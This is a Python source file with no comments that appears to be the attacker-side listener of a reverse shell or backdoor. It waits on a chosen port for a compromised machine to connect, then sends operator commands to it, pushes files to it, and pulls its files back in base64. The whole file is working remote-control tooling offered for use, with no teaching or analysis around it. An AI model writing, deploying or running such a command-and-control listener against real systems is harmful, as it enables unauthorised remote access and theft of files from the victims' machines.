import socket, base64, os
import simplejson as json
 
class Listener:
    def __init__(self, ip, port):
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((ip, int(port)))

    def start_listener(self):
        self.listener.listen(0)
        print("Listening the PORT")

        self.connection, ipaddr = self.listener.accept()
        print(f"Connection established from {ipaddr[0]}")

    def json_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode("utf-8"))

    def json_recv(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode()
                return json.loads(json_data)
            except:
                pass
    
    def write_file(self, file, content):
        with open(file, "wb") as f:
            f.write(content)
            return (f"{file} is downloaded\n")

    def read_file(self, file):
        with open(file, "rb") as f:
            return base64.b64encode(f.read())

    def start_command_executer(self):
        while True:
            cmd = input(">>>>>>> ")
            cmd = cmd.split(" ")

            if cmd[0] == "upload" and len(cmd) > 1:
                if cmd[1] in os.listdir():
                    content = self.read_file(cmd[1])
                    cmd.append(content)
                else:
                    print("File not found")
                    continue
        
            self.json_send(cmd)

            if cmd[0] == "exit":
                print("Listener Closed")
                self.connection.close()
                exit()

            output = self.json_recv()

            if cmd[0] == "download" and len(cmd) > 1 and output != "File not found\n":
                output = self.write_file(cmd[1], base64.b64decode(output))
            elif cmd[0] == "read" and len(cmd) > 1:
                output = base64.b64decode(output).decode() + "\n"

            print(output, end="")

if __name__ == "__main__":
    port = input("Enter the port to listen: ")
    my_listener = Listener("0.0.0.0", int(port))
    my_listener.start_listener()
    my_listener.start_command_executer()
